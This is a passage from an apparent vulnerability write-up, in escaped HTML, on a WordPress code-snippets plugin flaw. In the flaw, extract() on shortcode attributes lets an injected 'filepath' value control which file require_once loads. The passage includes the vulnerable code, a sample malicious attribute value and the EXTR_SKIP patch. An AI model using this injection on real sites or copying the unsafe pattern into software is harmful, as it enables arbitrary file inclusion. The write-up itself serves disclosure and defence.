class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;Avoiding&amp;ensp;extract&amp;ensp;is&amp;ensp;typically&amp;ensp;recommended,&amp;ensp;however&amp;ensp;in&amp;ensp;this&amp;ensp;situation&amp;ensp;we&amp;ensp;want&amp;ensp;to&amp;ensp;make&amp;ensp;it&amp;ensp;easy&amp;ensp;for&amp;ensp;snippet&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;authors&amp;ensp;to&amp;ensp;use&amp;ensp;custom&amp;ensp;attributes.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;@phpcs:disable&amp;ensp;WordPress.PHP.DontExtract.extract_extract&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;extract&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_get_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;code&gt;evaluate_shortcode_from_flat_file&lt;/code&gt;, an &lt;strong&gt;anonymous function&lt;/strong&gt; is defined and immediately invoked (IIFE). It receives &lt;code&gt;$atts&lt;/code&gt; (the shortcode attributes array) and uses &lt;code&gt;$filepath&lt;/code&gt; from the outer scope via &lt;code&gt;use&amp;ensp;($filepath)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;extract($atts)&lt;/code&gt; statement converts each element in the &lt;code&gt;$atts&lt;/code&gt; array into a separate variable in the current scope&amp;rsquo;s symbol table.&lt;/p&gt;&#xA;&lt;p&gt;Example:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;color&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;blue&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;size&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;large&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;extract&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Now&amp;ensp;we&amp;ensp;have&amp;ensp;$color&amp;ensp;=&amp;ensp;&amp;#39;blue&amp;#39;,&amp;ensp;$size&amp;ensp;=&amp;ensp;&amp;#39;large&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Internally, PHP manages variables through &lt;strong&gt;zval containers&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition quote open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Quote&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A PHP variable is stored in a container called a &amp;ldquo;zval&amp;rdquo;. A zval container contains, besides the variable&amp;rsquo;s type and value, two additional bits of information. The first is called &amp;ldquo;is_ref&amp;rdquo; and is a boolean value indicating whether or not the variable is part of a &amp;ldquo;reference set&amp;rdquo;. With this bit, PHP&amp;rsquo;s engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the &amp;amp; operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called &amp;ldquo;refcount&amp;rdquo;, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;When &lt;code&gt;extract()&lt;/code&gt; runs:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Each element in &lt;code&gt;$atts&lt;/code&gt; is mapped to a new variable.&lt;/li&gt;&#xA;&lt;li&gt;These variables point to the same &lt;strong&gt;zval&lt;/strong&gt; as the value in the array.&lt;/li&gt;&#xA;&lt;li&gt;This increases the &lt;strong&gt;refcount&lt;/strong&gt; (number of variable names referencing the same value).&lt;/li&gt;&#xA;&lt;li&gt;When the scope ends, the symbol table is destroyed, refcount decreases, and memory is freed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Variable name collision:&lt;/strong&gt;&#xA;If &lt;code&gt;$atts&lt;/code&gt; contains a key that matches an existing variable in the scope (e.g., &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt;), that variable will be overwritten.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;filepath&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/tmp/malicious.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;extract&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;require_once&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filepath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;now&amp;ensp;loads&amp;ensp;the&amp;ensp;file&amp;ensp;from&amp;ensp;$atts,&amp;ensp;not&amp;ensp;the&amp;ensp;original&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is the root cause of the vulnerability: an attacker can inject &lt;code&gt;&amp;quot;filepath&amp;quot;&lt;/code&gt; to control which file is &lt;code&gt;require_once&lt;/code&gt;.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch (v3.9.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/diff.png&#39; alt=&#34;Diff&#34; height=&#34;325&#34; width=&#34;1826&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patch, the &lt;code&gt;extract()&lt;/code&gt; call was added with the &lt;code&gt;EXTR_SKIP&lt;/code&gt; option.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;This ensures that if &lt;code&gt;$atts&lt;/code&gt; has a key matching an existing variable, the original variable is not overwritten.&lt;/li&gt;&#xA;&lt;li&gt;Thus, &lt;code&gt;$filepath&lt;/code&gt; from the outer scope remains safe, eliminating the risk of being replaced by &lt;code&gt;$atts&lt;/code&gt; data.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a shortcode:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt;&amp;ensp;&lt;span class=&#34;no&#34;&gt;CONTENT_SHORTCODE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;code_snippet&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;CONTENT_SHORTCODE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;render_content_shortcode&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When this shortcode appears in post/page content, WordPress calls the &lt;code&gt;render_content_shortcode&lt;/code&gt; callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;render_content_shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;convert_boolean_attribute_flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;network&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;format&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcodes&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$original_atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;shortcode_atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;snippet_id&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;network&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;php&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;format&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcodes&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$atts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;CONTENT_SHORTCODE&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 